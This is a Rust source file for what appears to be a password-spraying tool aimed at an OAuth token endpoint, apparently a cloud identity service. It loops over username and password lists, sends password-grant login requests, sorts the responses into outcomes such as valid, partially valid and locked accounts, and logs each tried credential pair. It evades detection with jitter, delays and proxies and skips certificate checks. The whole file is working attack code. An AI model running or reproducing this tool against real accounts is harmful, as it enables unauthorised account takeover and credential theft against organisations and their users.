mod args;
mod constants;
mod structs;

use args::Args;
use clap::Parser;
use constants::{ENDPOINTS, ERROR_CODES};
use rand::Rng;
use reqwest::{blocking::Client, blocking::ClientBuilder, blocking::Response, Proxy, StatusCode};
use simplelog::{
    debug, error, info, trace, ColorChoice, CombinedLogger, ConfigBuilder, TermLogger,
    TerminalMode, WriteLogger,
};
use std::{
    fs::{create_dir_all, File},
    io::{BufRead, BufReader, Read, Result, Seek, SeekFrom},
    thread,
    time::Duration,
};
use structs::{BadRequest, Foo};

fn send_request(
    client: Client,
    endpoint: String,
    username: String,
    password: String,
    resource_principal: String,
) -> Response {
    let body = format!(
        "client_id={client_id}&client_info={client_info}&grant_type={grant_type}&password={password}&resource={resource}&scope={scope}&username={username}",
        client_id="1b730954-1685-4b74-9bfd-dac224a7b894",
        client_info="1",
        grant_type="password",
        password=password,
        resource=ENDPOINTS[resource_principal.as_str()],
        scope="openid",
        username=username,
    );
    let response = client
        .post(endpoint)
        .header(reqwest::header::ACCEPT, "application/json")
        .header(
            reqwest::header::CONTENT_TYPE,
            "application/x-www-form-urlencoded",
        )
        .body(body)
        .send()
        .unwrap();

    return response;
}

fn parse_response(response: Response) -> Foo {
    trace!("HTTP status: {}", response.status());

    match response.status() {
        StatusCode::OK => {
            trace!("HTTP body: {}", response.text().unwrap());

            return Foo {
                error_code: None,
                message: "CREDENTIALS_FOUND",
                r#type: "SUCCESS",
            };
        }
        StatusCode::BAD_REQUEST => {
            let json_body = response.json::<BadRequest>().unwrap();

            trace!("JSON body: {:#?}", json_body);

            for entry in ERROR_CODES {
                if entry.error_code.unwrap() == json_body.error_codes[0] {
                    return entry;
                }
            }

            return Foo {
                error_code: Some(json_body.error_codes[0]),
                // message: format!("UNHANDLED_EXCEPTION (ERROR_CODE:<b>{}</b>)", json_body.error_codes[0]),
                message: "UNHANDLED_EXCEPTION (<b>ERROR_CODE</b>)",
                r#type: "ERROR",
            };
        }
        _ => {
            return Foo {
                error_code: None,
                // message: format!("UNHANDLED_EXCEPTION (ERROR_CODE:<b>{}</b>)", response.status()),
                message: "UNHANDLED_EXCEPTION (<b>HTTP_STATUS</b>)",
                r#type: "ERROR",
            };
        }
    };
}

fn main() -> Result<()> {
    let args = Args::parse();

    create_dir_all("results")?;

    let config = ConfigBuilder::new()
        .add_filter_ignore_str("reqwest")
        .add_filter_ignore_str("rustls")
        .build();

    let _ = CombinedLogger::init(vec![
        TermLogger::new(
            args.verbose.log_level_filter(),
            config.clone(),
            TerminalMode::Stdout,
            ColorChoice::Auto,
        ),
        WriteLogger::new(
            args.verbose.log_level_filter(),
            config.clone(),
            File::create(args.outfile.clone()).unwrap(),
        ),
    ]);

    debug!("CLI arguments: {:#?}", args);

    let mut client_builder = ClientBuilder::new().danger_accept_invalid_certs(true);

    if args.http_2 {
        client_builder = client_builder.use_rustls_tls();
    }

    if !args.proxy.is_none() {
        let proxy = args.proxy.unwrap();

        info!("Proxy set to: <b>{}</>", proxy);

        client_builder = client_builder.proxy(Proxy::all(proxy).unwrap());
    }

    let client = client_builder.build().unwrap();

    let mut username_buf_reader = BufReader::new(File::open(args.username)?);
    let mut password_buf_reader = BufReader::new(File::open(args.password)?);

    let total_passwords_count = password_buf_reader.by_ref().lines().count();
    let total_candidates_count =
        username_buf_reader.by_ref().lines().count() * total_passwords_count;

    info!(
        "Saving output to: <b>{}</>",
        args.outfile.file_name().unwrap().to_string_lossy()
    );

    let mut i: u128 = 1;
    let mut j: u128 = 1;

    password_buf_reader.seek(SeekFrom::Start(0))?;

    'outer: for password in password_buf_reader.by_ref().lines() {
        let password = password.unwrap();

        username_buf_reader.seek(SeekFrom::Start(0))?;

        for username in username_buf_reader.by_ref().lines() {
            let mut username: String = username.unwrap();

            if !args.tenant.as_ref().is_none() {
                username = format!("{}@{}", username, args.tenant.as_ref().unwrap());
            }

            let result: Foo = parse_response(send_request(
                client.clone(),
                args.endpoint.clone(),
                username.clone(),
                password.clone(),
                args.resource_principal.clone(),
            ));

            let mut success = false;
            let formatted_output = format!(
                "[cand:<b>{}/{}</>] [passwd:<b>{}/{}</>] [<cyan>{}</>] {}:{}",
                i,
                total_candidates_count,
                j,
                total_passwords_count,
                args.resource_principal,
                username,
                password
            );

            match result.r#type {
                "FAILURE" => debug!("{} -> <yellow>{}</>", formatted_output, result.message),
                "LOCKED" => debug!("{} -> <magenta>{}</>", formatted_output, result.message),
                "PARTIAL_SUCCESS" => {
                    success = true;
                    info!("{} -> <blue>{}</>", formatted_output, result.message);
                }
                "SUCCESS" => {
                    success = true;
                    info!("{} -> <green>{}</>", formatted_output, result.message);
                }
                _ => error!("{} -> <red>{}</>", formatted_output, result.message),
            }

            if args.continue_on_success {
                // Do nothing... 🦥
            } else {
                if success {
                    break 'outer;
                }
            }

            i += 1;

            let jitter = rand::thread_rng().gen_range(0..=args.jitter);

            thread::sleep(Duration::from_secs(args.delay + jitter));
        }

        j += 1;
    }

    Ok(())
}
